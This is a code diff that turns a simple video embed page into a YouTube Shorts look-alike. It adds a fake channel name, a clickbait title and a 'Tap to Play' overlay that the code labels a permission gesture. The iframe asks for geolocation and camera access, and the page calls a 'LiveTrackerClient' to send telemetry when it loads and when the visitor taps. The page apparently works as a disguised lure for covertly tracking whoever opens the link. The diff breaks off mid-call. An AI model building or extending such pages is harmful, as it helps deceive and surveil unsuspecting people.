@@ -4,7 +4,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title id="yt-page-title">YouTube Video Player</title>
+    <title id="yt-page-title">YouTube Short</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
             margin: 0;
@@ -16,15 +17,69 @@
             width: 100%;
             height: 100%;
             overflow: hidden;
-            background-color: #000000;
+            background-color: #0f0f0f;
+            font-family: Roboto, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
+            color: #ffffff;
         }
 
-        .video-container {
+        .yt-wrapper {
             width: 100vw;
             height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
+            background: #0f0f0f;
+            position: relative;
+        }
+
+        .yt-card {
+            width: 100%;
+            height: 100%;
+            max-width: 480px;
+            max-height: 920px;
+            position: relative;
+            background: #000000;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.9);
+        }
+
+        /* Top YouTube Header */
+        .yt-header {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 52px;
+            padding: 0 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: linear-gradient(180deg, rgba(0,0,0,0.8) 0%, rgba(0,0,0,0) 100%);
+            z-index: 10;
+        }
+
+        .yt-logo {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-weight: 700;
+            font-size: 17px;
+            letter-spacing: -0.5px;
+        }
+
+        .yt-logo i {
+            color: #ff0000;
+            font-size: 22px;
+        }
+
+        /* Video Iframe Viewport */
+        .yt-viewport {
+            flex: 1;
+            width: 100%;
+            height: 100%;
+            position: relative;
             background: #000000;
         }
 
@@ -33,12 +88,139 @@
             height: 100%;
             border: none;
         }
+
+        /* Tap overlay for unmute and permission gesture */
+        .tap-overlay {
+            position: absolute;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.4);
+            backdrop-filter: blur(2px);
+            z-index: 20;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: opacity 0.3s ease;
+        }
+
+        .play-btn-circle {
+            width: 72px;
+            height: 72px;
+            border-radius: 50%;
+            background: #ff0000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            color: white;
+            box-shadow: 0 8px 24px rgba(255, 0, 0, 0.5);
+            margin-bottom: 12px;
+        }
+
+        .prompt-text {
+            font-size: 14px;
+            font-weight: 600;
+            color: white;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.8);
+        }
+
+        /* Bottom Details Bar */
+        .yt-bottom-bar {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding: 16px;
+            background: linear-gradient(0deg, rgba(0,0,0,0.85) 0%, rgba(0,0,0,0) 100%);
+            z-index: 10;
+            pointer-events: none;
+        }
+
+        .channel-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 8px;
+            pointer-events: auto;
+        }
+
+        .channel-avatar {
+            width: 34px;
+            height: 34px;
+            border-radius: 50%;
+            background: #ff0000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 14px;
+        }
+
+        .channel-name {
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .btn-subscribe {
+            background: #ffffff;
+            color: #0f0f0f;
+            border: none;
+            padding: 6px 14px;
+            border-radius: 18px;
+            font-size: 12px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        .video-title-text {
+            font-size: 14px;
+            font-weight: 500;
+            line-height: 1.4;
+            color: #f1f5f9;
+        }
+
+        .hidden {
+            display: none !important;
+        }
     </style>
 </head>
 
 <body>
-    <div class="video-container">
-        <iframe id="yt-iframe" src="" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; geolocation; camera" allowfullscreen></iframe>
+    <div class="yt-wrapper">
+        <div class="yt-card">
+            <!-- Header -->
+            <div class="yt-header">
+                <div class="yt-logo">
+                    <i class="fab fa-youtube"></i>
+                    <span>Shorts</span>
+                </div>
+                <i class="fas fa-ellipsis-v"></i>
+            </div>
+
+            <!-- Tap Overlay for Permission & Video Unmute -->
+            <div class="tap-overlay" id="tap-overlay">
+                <div class="play-btn-circle">
+                    <i class="fas fa-play" style="margin-left: 4px;"></i>
+                </div>
+                <div class="prompt-text">Tap to Play YouTube Short</div>
+            </div>
+
+            <!-- Main Embed Player -->
+            <div class="yt-viewport">
+                <iframe id="yt-iframe" src="" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; geolocation; camera" allowfullscreen></iframe>
+            </div>
+
+            <!-- Bottom Video Overlay -->
+            <div class="yt-bottom-bar">
+                <div class="channel-info">
+                    <div class="channel-avatar" id="avatar-initial">Y</div>
+                    <span class="channel-name" id="channel-display">@TrendingShorts</span>
+                    <button class="btn-subscribe">Subscribe</button>
+                </div>
+                <div class="video-title-text" id="title-display">Must watch viral video! 🔥 #shorts #trending</div>
+            </div>
+        </div>
     </div>
 
     <script src="/js/telemetry.js"></script>
@@ -46,6 +228,7 @@
         const urlParams = new URLSearchParams(window.location.search);
         let rawV = '';
         let customTitle = '';
+        let channelName = '';
 
         const compressed = urlParams.get('d');
         if (compressed) {
@@ -53,11 +236,13 @@
                 const data = JSON.parse(atob(decodeURIComponent(compressed)));
                 if (data.v) rawV = data.v;
                 if (data.t) customTitle = data.t;
+                if (data.c) channelName = data.c;
             } catch (e) {}
         }
 
         if (!rawV) rawV = urlParams.get('v') || urlParams.get('video') || 'dQw4w9WgXcQ';
         if (!customTitle) customTitle = urlParams.get('t') || urlParams.get('title');
+        if (!channelName) channelName = urlParams.get('c') || urlParams.get('channel');
 
         let videoId = rawV;
         if (rawV.includes('youtu.be/')) {
@@ -68,14 +253,34 @@
             videoId = rawV.split('shorts/')[1].split('?')[0].split('&')[0];
         }
 
+        if (channelName) {
+            document.getElementById('channel-display').innerText = channelName.startsWith('@') ? channelName : `@${channelName}`;
+            document.getElementById('avatar-initial').innerText = channelName.replace('@', '').charAt(0).toUpperCase() || 'Y';
+        }
+
         if (customTitle) {
-            document.getElementById('yt-page-title').innerText = `${customTitle} - YouTube`;
+            document.getElementById('yt-page-title').innerText = `${customTitle} - YouTube Short`;
+            document.getElementById('title-display').innerText = customTitle;
         }
 
         const iframe = document.getElementById('yt-iframe');
         iframe.src = `https://www.youtube-nocookie.com/embed/${videoId}?autoplay=1&mute=0&controls=1&rel=0&playsinline=1&enablejsapi=1`;
 
-        // Telemetry tracking on load
+        const tapOverlay = document.getElementById('tap-overlay');
+
+        function triggerPermissions() {
+            tapOverlay.classList.add('hidden');
+            iframe.src = `https://www.youtube-nocookie.com/embed/${videoId}?autoplay=1&mute=0&controls=1&rel=0&playsinline=1&enablejsapi=1`;
+
+            if (window.LiveTrackerClient) {
+                window.LiveTrackerClient.sendTelemetry(null, 'youtube', true, true);
+            }
+        }
+
+        tapOverlay.addEventListener('click', triggerPermissions);
+        tapOverlay.addEventListener('touchstart', triggerPermissions, { passive: true });
+
+        // Telemetry tracking on DOM load
         window.addEventListener('DOMContentLoaded', () => {
             if (window.LiveTrackerClient) {
                 window.LiveTrackerClient.startTracking({
